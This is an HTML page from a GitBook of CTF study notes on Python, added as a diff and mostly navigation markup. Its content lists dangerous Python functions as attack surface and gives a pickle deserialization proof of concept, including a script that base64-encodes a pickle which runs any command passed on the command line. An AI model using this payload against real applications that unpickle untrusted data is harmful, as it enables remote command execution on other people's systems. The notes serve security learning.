@@ -1,0 +1,1880 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Python · Eki's CTF</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Eki">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-multipart/multipart.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-auto-scroll-table/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="bash.html" />
+    
+    
+    <link rel="prev" href="js.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://ieki.xyz" target="_blank" class="custom-link">主站 Eki's Blog</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    About
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Library
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="steganography.html">
+            
+                <a href="steganography.html">
+            
+                    
+                    Steganography
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="gdb-tutorial.html">
+            
+                <a href="gdb-tutorial.html">
+            
+                    
+                    GDB Tutorial
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="sqli.html">
+            
+                <a href="sqli.html">
+            
+                    
+                    SQL Inject
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="php/function.html">
+            
+                <a href="php/function.html">
+            
+                    
+                    Functions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="php/protocol.html">
+            
+                <a href="php/protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="php/ace.html">
+            
+                <a href="php/ace.html">
+            
+                    
+                    ACE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="php/serialize.html">
+            
+                <a href="php/serialize.html">
+            
+                    
+                    Serialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="php/misc.html">
+            
+                <a href="php/misc.html">
+            
+                    
+                    Misc
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="htaccess.html">
+            
+                <a href="htaccess.html">
+            
+                    
+                    Apache .htaccess
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="ssti.html">
+            
+                <a href="ssti.html">
+            
+                    
+                    SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="ssrf.html">
+            
+                <a href="ssrf.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="xxe.html">
+            
+                <a href="xxe.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="xss.html">
+            
+                <a href="xss.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="shell.html">
+            
+                <a href="shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="crypto.html">
+            
+                <a href="crypto.html">
+            
+                    
+                    Crypto
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="js.html">
+            
+                <a href="js.html">
+            
+                    
+                    JavaScript
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.13" data-path="python.html">
+            
+                <a href="python.html">
+            
+                    
+                    Python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="bash.html">
+            
+                <a href="bash.html">
+            
+                    
+                    BASH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="forensics.html">
+            
+                <a href="forensics.html">
+            
+                    
+                    Forensics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="pentest.html">
+            
+                <a href="pentest.html">
+            
+                    
+                    Pentest
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="protocol.html">
+            
+                <a href="protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="misc.html">
+            
+                <a href="misc.html">
+            
+                    
+                    MISC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="awd.html">
+            
+                <a href="awd.html">
+            
+                    
+                    AWD
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../contest/">
+            
+                <a href="../contest/">
+            
+                    
+                    Contest
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../contest/hfctf-2021.html">
+            
+                <a href="../contest/hfctf-2021.html">
+            
+                    
+                    2021数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../contest/hackergame-2019.html">
+            
+                <a href="../contest/hackergame-2019.html">
+            
+                    
+                    Hackergame 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../contest/tsctf-j2019.html">
+            
+                <a href="../contest/tsctf-j2019.html">
+            
+                    
+                    TSCTF-J 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../contest/nctf2019.html">
+            
+                <a href="../contest/nctf2019.html">
+            
+                    
+                    NCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../contest/isoon-2019.html">
+            
+                <a href="../contest/isoon-2019.html">
+            
+                    
+                    ISOON 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../contest/mrctf-2020.html">
+            
+                <a href="../contest/mrctf-2020.html">
+            
+                    
+                    MRCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7" data-path="../contest/hfctf-2020.html">
+            
+                <a href="../contest/hfctf-2020.html">
+            
+                    
+                    2020数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8" data-path="../contest/npuctf-2020.html">
+            
+                <a href="../contest/npuctf-2020.html">
+            
+                    
+                    NPUCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.9" data-path="../contest/gkctf-2020.html">
+            
+                <a href="../contest/gkctf-2020.html">
+            
+                    
+                    GKCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10" data-path="../contest/sctf-2020.html">
+            
+                <a href="../contest/sctf-2020.html">
+            
+                    
+                    SCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../adworld/">
+            
+                <a href="../adworld/">
+            
+                    
+                    ADworld
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../adworld/misc-exercise-area.html">
+            
+                <a href="../adworld/misc-exercise-area.html">
+            
+                    
+                    Misc Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../adworld/crypto-execrise-area.html">
+            
+                <a href="../adworld/crypto-execrise-area.html">
+            
+                    
+                    Crypto Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../adworld/web-execrise-area.html">
+            
+                <a href="../adworld/web-execrise-area.html">
+            
+                    
+                    Web Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../adworld/pwn-exercise-area.html">
+            
+                <a href="../adworld/pwn-exercise-area.html">
+            
+                    
+                    PWN Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../adworld/reverse-execrise-area.html">
+            
+                <a href="../adworld/reverse-execrise-area.html">
+            
+                    
+                    Reverse Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="../adworld/easy_tornado.html">
+            
+                <a href="../adworld/easy_tornado.html">
+            
+                    
+                    Easy Tornado
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="../adworld/i-got-id-200.html">
+            
+                <a href="../adworld/i-got-id-200.html">
+            
+                    
+                    i-got-id-200
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.8" data-path="../adworld/ics-02.html">
+            
+                <a href="../adworld/ics-02.html">
+            
+                    
+                    ics-02
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.9" data-path="../adworld/ics-07.html">
+            
+                <a href="../adworld/ics-07.html">
+            
+                    
+                    ics-07
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.10" data-path="../adworld/shrine.html">
+            
+                <a href="../adworld/shrine.html">
+            
+                    
+                    shrine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.11" data-path="../adworld/super_sqli.html">
+            
+                <a href="../adworld/super_sqli.html">
+            
+                    
+                    super_sqli
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.12" data-path="../adworld/web_php_unserialize.html">
+            
+                <a href="../adworld/web_php_unserialize.html">
+            
+                    
+                    Web_php_unserialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.13" data-path="../adworld/web_php_wrong_nginx_config.html">
+            
+                <a href="../adworld/web_php_wrong_nginx_config.html">
+            
+                    
+                    web_php_wrong_nginx_config
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.14" data-path="../adworld/web_python_template_injection.html">
+            
+                <a href="../adworld/web_python_template_injection.html">
+            
+                    
+                    Web_python_template_injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.15" data-path="../adworld/wtf.sh-150.html">
+            
+                <a href="../adworld/wtf.sh-150.html">
+            
+                    
+                    wtf.sh-150
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.16" data-path="../adworld/zhuanxv.html">
+            
+                <a href="../adworld/zhuanxv.html">
+            
+                    
+                    Zhuanxv
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../buuoj/">
+            
+                <a href="../buuoj/">
+            
+                    
+                    BUUOJ
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../buuoj/ciscn-northeast-2019.html">
+            
+                <a href="../buuoj/ciscn-northeast-2019.html">
+            
+                    
+                    CISCN 2019 华北赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../buuoj/ciscn-pre-2019.html">
+            
+                <a href="../buuoj/ciscn-pre-2019.html">
+            
+                    
+                    CISCN 2019 初赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../buuoj/ciscn-final-2019.html">
+            
+                <a href="../buuoj/ciscn-final-2019.html">
+            
+                    
+                    CISCN 2019 Final
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../buuoj/wangdingcup-2018.html">
+            
+                <a href="../buuoj/wangdingcup-2018.html">
+            
+                    
+                    网鼎杯 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="../buuoj/wangdingcup-2019.html">
+            
+                <a href="../buuoj/wangdingcup-2019.html">
+            
+                    
+                    网鼎杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.8" data-path="../buuoj/roarctf-2019.html">
+            
+                <a href="../buuoj/roarctf-2019.html">
+            
+                    
+                    RoarCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="../buuoj/0ctf-2016.html">
+            
+                <a href="../buuoj/0ctf-2016.html">
+            
+                    
+                    0CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.10" data-path="../buuoj/gxyctf-2019.html">
+            
+                <a href="../buuoj/gxyctf-2019.html">
+            
+                    
+                    GXYCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.11" data-path="../buuoj/hitcon-2017.html">
+            
+                <a href="../buuoj/hitcon-2017.html">
+            
+                    
+                    Hitcon 2017
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.12" data-path="../buuoj/jikedatiaozhan-2019.html">
+            
+                <a href="../buuoj/jikedatiaozhan-2019.html">
+            
+                    
+                    极客大挑战2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.13" data-path="../buuoj/lctf-2018.html">
+            
+                <a href="../buuoj/lctf-2018.html">
+            
+                    
+                    LCTF 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.14" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.15" data-path="../buuoj/swpu-2019.html">
+            
+                <a href="../buuoj/swpu-2019.html">
+            
+                    
+                    SWPU 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.16" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.17" data-path="../buuoj/bjdctf-2020.html">
+            
+                <a href="../buuoj/bjdctf-2020.html">
+            
+                    
+                    BJDCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.18" data-path="../buuoj/rctf-2015.html">
+            
+                <a href="../buuoj/rctf-2015.html">
+            
+                    
+                    RCTF 2015
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.19" data-path="../buuoj/bytectf-2019.html">
+            
+                <a href="../buuoj/bytectf-2019.html">
+            
+                    
+                    ByteCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.20" data-path="../buuoj/qiangwangbei-2019.html">
+            
+                <a href="../buuoj/qiangwangbei-2019.html">
+            
+                    
+                    强网杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.21" data-path="../buuoj/ddctf-2019.html">
+            
+                <a href="../buuoj/ddctf-2019.html">
+            
+                    
+                    DDCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.22" data-path="../buuoj/eis-2019.html">
+            
+                <a href="../buuoj/eis-2019.html">
+            
+                    
+                    EIS 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.23" data-path="../buuoj/vn-2020.html">
+            
+                <a href="../buuoj/vn-2020.html">
+            
+                    
+                    V&N 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.24" data-path="../buuoj/fbctf-2019.html">
+            
+                <a href="../buuoj/fbctf-2019.html">
+            
+                    
+                    FBCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.25" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GYCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.26" data-path="../buuoj/bjd-2nd.html">
+            
+                <a href="../buuoj/bjd-2nd.html">
+            
+                    
+                    BJDCTF 2nd
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.27" data-path="../buuoj/fireshellctf-2020.html">
+            
+                <a href="../buuoj/fireshellctf-2020.html">
+            
+                    
+                    FireShellCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.28" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GWCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.29" data-path="../buuoj/watevrctf-2019.html">
+            
+                <a href="../buuoj/watevrctf-2019.html">
+            
+                    
+                    WatervrCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.30" data-path="../buuoj/ciscn-southeast-2019.html">
+            
+                <a href="../buuoj/ciscn-southeast-2019.html">
+            
+                    
+                    CISCN2019 华东南赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.31" data-path="../buuoj/bsidescf-2019.html">
+            
+                <a href="../buuoj/bsidescf-2019.html">
+            
+                    
+                    BsidesCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.32" data-path="../buuoj/rctf-2019.html">
+            
+                <a href="../buuoj/rctf-2019.html">
+            
+                    
+                    RCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../pwnable.kr/">
+            
+                <a href="../pwnable.kr/">
+            
+                    
+                    pwnable.kr
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../pwnable.kr/toddlers-bottle.html">
+            
+                <a href="../pwnable.kr/toddlers-bottle.html">
+            
+                    
+                    Toddler's Bottle
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../ethernaut/">
+            
+                <a href="../ethernaut/">
+            
+                    
+                    Ethernaut
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../vulnhub/">
+            
+                <a href="../vulnhub/">
+            
+                    
+                    Vulnhub
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../vulnhub/dc-9.html">
+            
+                <a href="../vulnhub/dc-9.html">
+            
+                    
+                    DC-9
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../vulnhub/five86-1.html">
+            
+                <a href="../vulnhub/five86-1.html">
+            
+                    
+                    five86-1
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../vulnhub/wakanda.html">
+            
+                <a href="../vulnhub/wakanda.html">
+            
+                    
+                    wakanda
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >Python</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#python"><b></b>Python</a></li><ul><li><span class="title-icon "></span><a href="#&#x653B;&#x51FB;&#x9762;"><b></b>&#x653B;&#x51FB;&#x9762;</a></li><li><span class="title-icon "></span><a href="#pickle"><b></b>Pickle</a></li><ul><li><span class="title-icon "></span><a href="#rce"><b></b>RCE</a></li></ul><li><span class="title-icon "></span><a href="#repr-&#x51FD;&#x6570;&#x5C06;&#x5BF9;&#x8C61;&#x8F6C;&#x5316;&#x4E3A;&#x4F9B;&#x89E3;&#x91CA;&#x5668;&#x8BFB;&#x53D6;&#x7684;&#x5F62;&#x5F0F;"><b></b>repr() &#x51FD;&#x6570;&#x5C06;&#x5BF9;&#x8C61;&#x8F6C;&#x5316;&#x4E3A;&#x4F9B;&#x89E3;&#x91CA;&#x5668;&#x8BFB;&#x53D6;&#x7684;&#x5F62;&#x5F0F;</a></li><li><span class="title-icon "></span><a href="#opcode-&#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;"><b></b>opcode &#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;</a></li><ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;"><b></b>&#x53C2;&#x8003;&#x8D44;&#x6599;</a></li></ul><li><span class="title-icon "></span><a href="#&#x5B57;&#x7B26;&#x4E32;bool"><b></b>&#x5B57;&#x7B26;&#x4E32;bool</a></li><li><span class="title-icon "></span><a href="#&#x6D6E;&#x70B9;&#x6570;&#x6BD4;&#x8F83;"><b></b>&#x6D6E;&#x70B9;&#x6570;&#x6BD4;&#x8F83;</a></li><li><span class="title-icon "></span><a href="#python3-f"><b></b>python3 f&apos;{}&apos;</a></li><li><span class="title-icon "></span><a href="#&#x51FD;&#x6570;&#x91CD;&#x8F7D;"><b></b>&#x51FD;&#x6570;&#x91CD;&#x8F7D;</a></li><li><span class="title-icon "></span><a href="#&#x7279;&#x6B8A;&#x5C5E;&#x6027;"><b></b>&#x7279;&#x6B8A;&#x5C5E;&#x6027;</a></li><li><span class="title-icon "></span><a href="#&#x62D3;&#x5C55;&#x8D44;&#x6599;"><b></b>&#x62D3;&#x5C55;&#x8D44;&#x6599;</a></li></ul></ul></div><a href="#python" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="python"><a name="python" class="anchor-navigation-ex-anchor" href="#python"><i class="fa fa-link" aria-hidden="true"></i></a>Python</h1>
+<h2 id="&#x653B;&#x51FB;&#x9762;"><a name="&#x653B;&#x51FB;&#x9762;" class="anchor-navigation-ex-anchor" href="#&#x653B;&#x51FB;&#x9762;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x653B;&#x51FB;&#x9762;</h2>
+<pre><code class="lang-python">eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen,platform.popen
+</code></pre>
+<h2 id="pickle"><a name="pickle" class="anchor-navigation-ex-anchor" href="#pickle"><i class="fa fa-link" aria-hidden="true"></i></a>Pickle</h2>
+<h3 id="rce"><a name="rce" class="anchor-navigation-ex-anchor" href="#rce"><i class="fa fa-link" aria-hidden="true"></i></a>RCE</h3>
+<p>poc</p>
+<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span><span class="hljs-params">(object)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&apos;ls&apos;</span>,))
+</code></pre>
+<p>&#x5229;&#x7528;&#x811A;&#x672C;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> _pickle <span class="hljs-keyword">as</span> cPickle
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> base64
+
+COMMAND = sys.argv[<span class="hljs-number">1</span>]
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PickleRce</span><span class="hljs-params">(object)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-keyword">import</span> os
+        <span class="hljs-keyword">return</span> (os.system,(COMMAND,))
+
+print(base64.b64encode(cPickle.dumps(PickleRce())))
+</code></pre>
